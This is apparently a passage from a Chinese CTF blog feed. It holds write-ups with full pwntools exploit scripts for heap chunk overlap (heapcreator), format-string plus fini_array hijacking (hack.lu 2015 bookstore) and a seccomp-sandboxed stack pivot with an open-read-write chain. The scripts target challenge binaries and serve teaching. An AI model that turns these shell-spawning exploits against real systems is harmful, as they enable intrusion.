heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们可以利用空间复用的机制改掉下一个chunk的size</p><p>create(0x18, b”one”)<br>create(0x10, b”two”) </p><p>会创建出4个0x20的chunk，其中one的chunk会利用two的pre_size来存放数据</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010202508.png" alt="image-20230311010202508"></p><p>这样我们编辑one的context就可以控制two的size</p><p>edit(0, “&#x2F;bin&#x2F;sh\x00” + “a” * 0x10 + “\x41”)</p><p>改为41</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311010444200.png" alt="image-20230311010444200"></p><p>再释放two  delete(1) 可以看到已经有了overlap的chunk</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311011034574.png" alt="image-20230311011034574"></p><p>再申请一个堆块create(0x30, p64(0) * 4 + p64(0x30) + p64(elf.got[‘free’]))</p><p>这样我们的 *heap会申请到0x20的chunk，content会申请到0x40的chunk，我们的0x40chunk会overlap到0x20的chunk，从而控制其内容，我们把他的content指针改为got就，可以在show的时候输出地址</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311012105213.png" alt="image-20230311012105213"></p><p>这样就可以得到system地址，这时候去edit two,就会修改free got里面内容，改为system，再去delete one，加上我们之前输入的binsh就可以拿到shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311014939768.png" alt="image-20230311014939768"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./heapcreator&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line">db(<span class="string">&#x27;b *0x00400A43&#x27;</span>)</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b&quot;one&quot;</span>) </span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&quot;two&quot;</span>) </span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">b&quot;\x41&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">free_ad =u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;free_addr&#x27;</span>,free_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_ad)</span><br><span class="line">base=free_ad-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; checksec books_e_o </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/books_e_o&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="大体思路"><a href="#大体思路" class="headerlink" title="大体思路"></a>大体思路</h3><p>稍微看一下漏洞挺多的</p><ul><li>main函数里有格式化字符串漏洞</li><li>delete_order函数里有uaf漏洞</li><li>edit_order函数里有任意堆覆盖漏洞，可以进行overlap</li></ul><p>堆我们不能自己申请，只能main前面申请了0x80大小的三个堆，后面submit时一个0x140堆</p><p>print(dest)</p><p>dest是第三个堆，我们可以利用先利用覆盖漏洞将第二个堆的size覆盖为0x150这样再delete这个堆就会把dest一块释放到bins，后面再submit申请时，就会申请到这个堆，submit这个堆是可以利用堆1和堆2中的值控制的，从而计算好偏移，控制dest，进一步利用格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">submit</span><span class="params">(<span class="type">char</span> *all, <span class="type">const</span> <span class="type">char</span> *order1, <span class="type">char</span> *order2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(all, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(order1);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order1, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(all, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(order2);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order2, v4);</span><br><span class="line">  *(_WORD *)&amp;all[<span class="built_in">strlen</span>(all)] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用格式化漏洞基本上都要先泄露地址，再布置改写地址，此题也不例外</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line"><span class="built_in">printf</span>(dest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>但是在格式化字符串漏洞之后，就会ret，无法再次利用，这就需要我们利用 fini_array hook掉执行流</p><blockquote><p>fini_array hook</p><p><code>.init_array</code>和 <code>.fini_array</code>中存放了指向初始化代码和终止代码的函数指针。</p><p><code>.init_array</code>会在main()函数调用前执行，这样可以通过修该地址的指针来将控制流指向病毒或者寄生代码，因为比main执行还早，大部分恶意软件都是hook这个，感觉c++的构造函数或许和这个相关</p><p><code>.fini_array</code> 函数指针在 main() 函数执行完之后才被触发，感觉c++的析构函数或许和这个相关</p><p>在<code>.init_array</code> array[0]-&gt;array[1]</p><p>在<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172008247.png" alt="image-20230311172008247"></p><p>这样我们就可以二次利用漏洞进行改写地址</p><h3 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h3><p>刚开始的堆</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172557368.png" alt="image-20230311172557368"></p><p>payload &#x3D; b”%”+str(2617).encode()+b”c%13$hn” + b’abc%51$p’ + b’def%26$p’<br>payload +&#x3D; b’A’*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b’\x00’)<br>payload +&#x3D; p64(0x151)</p><p>edit(1,payload)</p><p>覆盖size的堆</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172648818.png" alt="image-20230311172648818"></p><p>这里payload的%51是返回地址__libc_start_main+128的</p><blockquote><p>为什么是0x74呢</p><p>这里submit函数可以看出他还进行拼接，正常的话需要0x90个字节到达dest内容，</p><p>‘Order 1:<code>+</code>chunk1<code>+</code>\n<code>+</code>Order 2:<code>+</code>Order 1: ’ 拼接导致他会多28个字节</p><p>0x90-28&#x3D;0x74</p></blockquote><p>我们再</p><p>delete(2)</p><p>payload2 &#x3D; p8(0x0)*7 + p64(fini_array)<br>submit(payload2)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter first </span></span><br></pre></td></tr></table></figure><p>这里我们利用fget，的s是在栈上的，gdb得到fini_array被写到了格式化字符串第13个参数</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175311347.png" alt="image-20230311175311347"></p><p>0x400830和main地址 0x400A39只有一个字节的差距我们在第一个payload利用b”%”+str(2617).encode()+b”c%13$hn”改写为main，这样main ret是会再次返回到main</p><p>第一个pay的%26$p是</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175610680.png" alt="image-20230311175610680"></p><p>他和后面的返回地址已经下次hook返回到main的地址的返回地址的栈地址偏移是固定的</p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311180117794.png" alt="image-20230311180117794" style="zoom:67%;"><p>计算出来<code>ret_bp=fixed-0x461-0x100</code></p><p>这样我们就可以改写这个main的返回地址为one_gadget地址</p><p>payload&#x3D;b’%’+str(one_gadget&amp;0xff).encode()+b’c%13$hhn%’+str(((one_gadget&gt;&gt;8)&amp;0xffff)-(one_gadget&amp;0xff)).encode()+b’c%14$hn’<br>print(payload)<br>payload +&#x3D; b’A’*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b’\x00’)<br>payload +&#x3D; p64(0x151)<br>edit(1,payload)<br>delete(2)<br>payload&#x3D;p8(0x0)*7+p64(ret_bp)+p64(ret_bp+1)<br>submit(payload)</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181810289.png" alt="image-20230311181810289"></p><p>拿到shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181846332.png" alt="image-20230311181846332"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./books_e_o&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">order, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; order:\n&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">order</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order + <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span> + payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 1: &#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 2: Order 1: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># db(&#x27;b *0x400A91&#x27;)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">2617</span>).encode()+<span class="string">b&quot;c%13$hn&quot;</span>  + <span class="string">b&#x27;abc%51$p&#x27;</span> + <span class="string">b&#x27;def%26$p&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload2 = p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">submit(payload2)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">ru(<span class="string">b&#x27;def&#x27;</span>)</span><br><span class="line">fixed=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">p(<span class="string">&#x27;fixed&#x27;</span>,fixed)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">ret_bp=fixed-<span class="number">0x461</span>-<span class="number">0x100</span></span><br><span class="line">p(<span class="string">&#x27;ret_bp&#x27;</span>,ret_bp)</span><br><span class="line">one_gadget=<span class="number">0xebcf5</span>+base</span><br><span class="line">p(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%13$hhn%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)-(one_gadget&amp;<span class="number">0xff</span>)).encode()+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p8(<span class="number">0x0</span>)*<span class="number">7</span>+p64(ret_bp)+p64(ret_bp+<span class="number">1</span>)</span><br><span class="line">submit(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Chunk Extend And Overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023黄河流域公安院校网络空间安全技能挑战赛 PWN</title>
      <link href="/2023/03/05/sd-police2023-pwn/"/>
      <url>/2023/03/05/sd-police2023-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="SandBox"><a href="#SandBox" class="headerlink" title="SandBox"></a>SandBox</h1><p>链接：<a href="https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg">https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg</a><br>提取码：05zg</p><p>题目开启了沙箱机制</p><blockquote><p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用</p><p>实现沙箱机制</p><ul><li><p>一种采用prctl函数调用</p></li><li><p>一种是使用seccomp库函数。</p></li></ul></blockquote><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec sandbox</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/sandbox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>可以看到禁用了execve系统调用，同时system是不能使用的，因为system是glibc中的函数，用shell来调用程序&#x3D;fork+exec+waitpid</p><img src="/2023/03/05/sd-police2023-pwn/image-20230305122657981.png" alt="image-20230305122657981" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A bit small, but it doesn&#x27;t affect me cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>只有0x10个字节的大小，我们先进行栈迁移</p><p>选择bss&#x3D;0x404500</p><ul><li><p>我们先payload&#x3D;padding+p64(bss)+p64(read_ret)，由于是采用leave ret平栈，会把rbp改为bss地址，ret 到read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305154743044.png" alt="image-20230305154743044" style="zoom: 67%;"></li></ul></li><li><p>payload&#x3D;padding+p64(bss+0x50)+p64(read_ret)，我们在bss-0x50输入</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155002168.png" alt="image-20230305155002168" style="zoom:80%;"></li></ul></li><li><p>平栈后我们的rsp为0x404510(因为在leave mov esp,ebp后需要pop rbp和ret栈顶rsp会提高0x10),rbp为0x404550，再次返回read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155441801.png" alt="image-20230305155441801" style="zoom:80%;"></li></ul></li><li><p>payload&#x3D;p64(bss+0x60)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)会在bss输入payload</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305161933424.png" alt="image-20230305161933424"></li></ul></li><li><p>这里我们call read函数时会把返回地址放在0x404508处，我们把他覆盖为了pop rdi ；ret，所以在返回时就可以输出got表返回main</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305231637179.png" alt="image-20230305231637179" style="zoom:67%;"></li></ul></li><li><p>这样我们就可以返回main，再次循环利用迁移和覆盖read返回</p></li></ul><h2 id="ORW读取flag"><a href="#ORW读取flag" class="headerlink" title="ORW读取flag"></a>ORW读取flag</h2><p>对于<strong>32<em>位程序，应调用</em></strong>int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。</p><p>对于64位程序，应调用 syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p><p>从使用上来看</p><ul><li>约定的传递参数的寄存器不同<ul><li>syscall 使用的是 edi 、 esi 、 edx 、 ecx，</li><li>int 0x80 使用的是 ebx 、 ecx 、 edx 、 esi 、 edi</li></ul></li></ul><p>从内部机制来看</p><ul><li>syscall 调用的是C库函数，是在用户空间的，并且最终还是会调用内核函数（入口点）</li><li>int 0x80 调用的是内核函数，是在内核空间的</li></ul><p>我们先把‘.&#x2F;flag’字符串通过read函数写入内存payload&#x3D;b’deadbeef’+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p><blockquote><p>三个文件描述符</p><p>0 标准输入</p><p>1 标志输出 </p><p>2 标志错误 </p></blockquote><p>在利用标准库里的syscall打开flag文件，read读取到内存</p><p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘syscall’])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘read’])+p64(main)</p><blockquote><p>syscall汇编如下</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306010914175.png" alt="image-20230306010914175"></p><p>会把rdi rsi rdx等，依次给到rax rdi  rsi等 再内核函数syscall系统调用</p><p>open打开文件描述符需要提供给read函数，一般都是从3开始(012被标志占用)</p></blockquote><p>最后读取flag到标准输出，payload&#x3D;b’deadbeef’+p64(rdi)+p64(1)+p64(rsi_r15)+p64(0x404900)+p64(0x100)+p64(base+libc.sym[‘write’])+p64(main)</p><p>拿到flag</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306012654458.png" alt="image-20230306012654458"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./sandbox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.13.251.106&#x27;</span>,<span class="string">&#x27;8004&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> 